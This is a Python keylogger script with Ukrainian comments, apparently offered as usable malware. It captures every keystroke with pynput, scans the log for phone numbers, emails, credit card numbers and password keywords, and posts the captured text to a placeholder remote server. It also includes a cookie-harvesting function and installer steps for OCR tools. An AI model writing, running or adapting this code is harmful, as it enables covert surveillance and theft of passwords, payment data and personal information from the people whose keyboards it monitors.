import os
import subprocess
import sys
import time
from pynput import keyboard
import re
import shutil
import requests

# Змінні для зберігання натискань клавіш і стану Caps Lock
keys = []
caps_lock_active = False
file_path = "keylog.txt"
sensitive_file_path = "sensitive_data.txt"
cookie_file_path = "cookies.txt"
max_log_size = 1 * 1024 * 1024  # 1 MB
data_endpoint = "http://your-server-address/receive_data"  # URL для надсилання даних

# Функція для архівації лог-файлу при досягненні певного розміру
def archive_log_file():
    if os.path.exists(file_path) and os.path.getsize(file_path) > max_log_size:
        shutil.move(file_path, f"{file_path}.backup")
        print(f"Файл {file_path} досяг максимального розміру. Створено архів.")

# Функція для запису натискань у файл та надсилання даних
def write_to_file():
    try:
        with open(file_path, "a") as log_file:
            logged_text = ''.join(keys)
            log_file.write(logged_text + '\n')
            check_sensitive_data(logged_text)
            keys.clear()  # Очищаємо список після запису
        archive_log_file()  # Перевіряємо розмір файлу після запису
        send_data(logged_text)  # Надсилаємо дані на сервер
    except IOError as e:
        print(f"Помилка запису в файл: {e}")

# Функція для надсилання даних на сервер
def send_data(data):
    try:
        response = requests.post(data_endpoint, json={"data": data})
        if response.status_code == 200:
            print("Дані успішно надіслані на сервер.")
        else:
            print(f"Помилка при надсиланні даних: {response.status_code}")
    except requests.RequestException as e:
        print(f"Помилка з'єднання: {e}")

# Функція для перевірки чутливих даних
def check_sensitive_data(text):
    phone_pattern = r'\b\d{10,15}\b'
    email_pattern = r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+'
    credit_card_pattern = r'\b(?:\d[ -]*?){13,16}\b'
    password_keywords = ["password", "пароль", "pass", "pwd"]

    if re.search(phone_pattern, text):
        with open(sensitive_file_path, "a") as sensitive_file:
            sensitive_file.write(f"Знайдено номер телефону: {text}\n")

    if re.search(email_pattern, text):
        with open(sensitive_file_path, "a") as sensitive_file:
            sensitive_file.write(f"Знайдено email: {text}\n")

    if re.search(credit_card_pattern, text):
        with open(sensitive_file_path, "a") as sensitive_file:
            sensitive_file.write(f"Знайдено номер кредитної картки: {text}\n")

    if any(keyword in text.lower() for keyword in password_keywords):
        with open(sensitive_file_path, "a") as sensitive_file:
            sensitive_file.write(f"Знайдено можливий пароль: {text}\n")

# Функція для обробки натискання клавіш
def on_press(key):
    global caps_lock_active
    if key == keyboard.Key.caps_lock:
        caps_lock_active = not caps_lock_active
        return

    try:
        if caps_lock_active and key.char.isalpha():
            keys.append(key.char.upper())
        else:
            keys.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            keys.append(' ')
        elif key == keyboard.Key.enter:
            keys.append('\n')
        elif key == keyboard.Key.backspace:
            keys.append('[BACKSPACE]')
        else:
            keys.append(f'[{str(key)}]')

# Функція для обробки відпускання клавіш
def on_release(key):
    if key == keyboard.Key.esc:
        write_to_file()
        return False

# Запуск кейлогера
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    while listener.running:
        time.sleep(10)
        if keys:
            write_to_file()

# Збір кукі через HTTP-запит
def get_cookies():
    session = requests.Session()
    response = session.post(
        url='https://yourwebsite.com/login',
        data={'username': 'test', 'password': 'test'}
    )
    cookies = response.cookies
    with open(cookie_file_path, "a") as cookie_file:
        for cookie in cookies:
            cookie_file.write(f"{cookie.name}: {cookie.value}\n")

    with open(cookie_file_path, "a") as cookie_file:
        cookie_file.write(f"Set-Cookie: {response.headers.get('Set-Cookie', 'None')}\n")
    print("Кукі збережено в окремий файл.")

# Функції для встановлення Tesseract і pytesseract
def install_tesseract():
    if sys.platform.startswith('linux'):
        try:
            subprocess.run(["sudo", "apt-get", "install", "tesseract-ocr", "-y"], check=True)
            print("Tesseract успішно встановлено!")
        except subprocess.CalledProcessError:
            print("Помилка при встановленні Tesseract!")
    elif sys.platform == 'win32':
        try:
            subprocess.run(["choco", "install", "tesseract", "-y"], check=True)
            print("Tesseract успішно встановлено!")
        except subprocess.CalledProcessError:
            print("Помилка при встановленні Tesseract!")
        except FileNotFoundError:
            print("Chocolatey не знайдено. Встановіть Chocolatey за посиланням: https://chocolatey.org/install")

def check_tesseract():
    try:
        subprocess.run(["tesseract", "--version"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except FileNotFoundError:
        return False

def install_pytesseract():
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "pytesseract"], check=True)
        print("pytesseract успішно встановлено!")
    except subprocess.CalledProcessError:
        print("Помилка при встановленні pytesseract!")

def check_pytesseract():
    try:
        import pytesseract
        return True
    except ImportError:
        return False

# Перевірка та встановлення Tesseract і pytesseract
if not check_tesseract():
    print("Tesseract не знайдено. Спроба встановити...")
    install_tesseract()

if not check_pytesseract():
    print("pytesseract не знайдено. Спроба встановити...")
    install_pytesseract()

# Виклик функції для отримання кукі
get_cookies()
